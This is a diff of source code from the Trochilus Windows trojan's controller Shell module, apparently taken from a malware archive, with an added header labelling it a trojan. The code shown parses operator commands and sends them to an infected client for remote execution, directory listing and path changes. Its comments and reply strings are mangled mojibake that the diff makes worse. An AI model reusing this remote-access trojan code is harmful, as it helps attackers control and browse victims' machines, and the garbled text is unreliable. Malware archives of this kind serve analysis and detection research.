@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "CommManager.h"
 #include "common.h"
@@ -23,7 +34,7 @@ BOOL Shell::Init( LPCTSTR clientid )
 		return FALSE;
 	}
 
-	//ÉèÖÃ³õÊ¼Ä¿Â¼
+	//ï¿½ï¿½ï¿½Ã³ï¿½Ê¼Ä¿Â¼
 	for (int i = 0; i < 26; i++)
 	{
 		if (m_partitions[i].bValid)
@@ -44,7 +55,7 @@ LPCTSTR Shell::GetCurrentPath() const
 
 BOOL Shell::ExecuteCommand( LPCTSTR cmdlinestr, tstring& reply )
 {
-	//·Ö¸î²¢ÕûÀíÃüÁîÐÐµÄ¸÷¸ö²¿·Ö
+	//ï¿½Ö¸î²¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÐµÄ¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	tstring cmdline = cmdlinestr;
 	trim(cmdline, ' ');
 	trim(cmdline, '\n');
@@ -52,7 +63,7 @@ BOOL Shell::ExecuteCommand( LPCTSTR cmdlinestr, tstring& reply )
 	TStringVector parts;
 	splitByChar(cmdline.c_str(), parts, ' ');
 
-	//ÇåÀíÎÞÐ§²ÎÊý
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð§ï¿½ï¿½ï¿½ï¿½
 	TStringVector::iterator iter = parts.begin();
 	while (iter != parts.end())
 	{
@@ -68,14 +79,14 @@ BOOL Shell::ExecuteCommand( LPCTSTR cmdlinestr, tstring& reply )
 		}
 	}
 
-	//¼ì²éÊÇ·ñÓÐ¿ÉÓÃµÄ²¿·Ö
+	//ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½Ð¿ï¿½ï¿½ÃµÄ²ï¿½ï¿½ï¿½
 	if (parts.size() == 0)
 	{
 		reply = _T("");
 		return TRUE;
 	}
 
-	//²éÕÒ¿ÉÓÃµÄÃüÁî
+	//ï¿½ï¿½ï¿½Ò¿ï¿½ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½
 	tstring& cmdname = parts[0];
 	makeLower(cmdname);
 
@@ -92,14 +103,14 @@ BOOL Shell::ExecuteCommand( LPCTSTR cmdlinestr, tstring& reply )
 		return Execute_Disks(parts, reply);
 	}
 
-	//½«ÃüÁî·¢µ½¿Í»§¶ËÈ¥Ö´ÐÐ
+	//ï¿½ï¿½ï¿½ï¿½ï¿½î·¢ï¿½ï¿½ï¿½Í»ï¿½ï¿½ï¿½È¥Ö´ï¿½ï¿½
 	CommData commandCommData;
 	commandCommData.SetMsgID(MSGID_EXECUTE_CMDLINE);
 	commandCommData.SetData(_T("cmdline"), cmdline.c_str());
 	CommData replyCommData;
 	if (! AskAndWaitForReply(commandCommData, replyCommData))
 	{
-		reply = _T("µÈ´ý¿Í»§¶Ë»ØÓ¦³¬Ê±");
+		reply = _T("ï¿½È´ï¿½ï¿½Í»ï¿½ï¿½Ë»ï¿½Ó¦ï¿½ï¿½Ê±");
 		return FALSE;
 	}
 	else
@@ -258,12 +269,12 @@ BOOL Shell::Execute_Dir( const TStringVector& cmdparts, tstring& reply )
 	CommData commData;
 	if (! AskAndWaitForReply(request, commData))
 	{
-		reply = _T("¿Í»§¶ËÏìÓ¦³¬Ê±");
+		reply = _T("ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½Ê±");
 		return FALSE;
 	}
 
 	DECLARE_STR_PARAM(result);
-	//	result		str	Ä¿Â¼ÄÚÈÝ	filename(str)|attr(dword)|filesize(uint64)|lastWriteTime(uint64 filetime):
+	//	result		str	Ä¿Â¼ï¿½ï¿½ï¿½ï¿½	filename(str)|attr(dword)|filesize(uint64)|lastWriteTime(uint64 filetime):
 	tostringstream toss;
 	TStringVector fileParts;
 	splitByChar(result.c_str(), fileParts, ':');
@@ -319,7 +330,7 @@ BOOL Shell::Execute_Cd( const TStringVector& cmdparts, tstring& reply )
 		tstring target = cmdparts[1];
 		if (target.size() == 2 && target[1] == ':')
 		{
-			//ÇÐ»»µ±Ç°·ÖÇø
+			//ï¿½Ð»ï¿½ï¿½ï¿½Ç°ï¿½ï¿½ï¿½ï¿½
 			int index = 0;
 			TCHAR partition = target[0];
 			if (partition >= 'a' && partition <= 'z') index = partition - 'a';
@@ -346,12 +357,12 @@ BOOL Shell::Execute_Cd( const TStringVector& cmdparts, tstring& reply )
 			tstring testPath;
 			if (target.size() > 2 && target[1] == ':')
 			{
-				//¾ø¶ÔÂ·¾¶
+				//ï¿½ï¿½ï¿½ï¿½Â·ï¿½ï¿½
 				testPath = target;
 			}
 			else
 			{
-				//Ïà¶ÔÂ·¾¶
+				//ï¿½ï¿½ï¿½Â·ï¿½ï¿½
 				testPath = m_currentPath;
 				testPath += '\\';
 				testPath += target;
@@ -376,7 +387,7 @@ BOOL Shell::Execute_Cd( const TStringVector& cmdparts, tstring& reply )
 			}
 			else
 			{
-				reply = _T("µÈ´ý¿Í»§¶Ë»ØÓ¦³¬Ê±");
+				reply = _T("ï¿½È´ï¿½ï¿½Í»ï¿½ï¿½Ë»ï¿½Ó¦ï¿½ï¿½Ê±");
 				return FALSE;
 			}
 		}
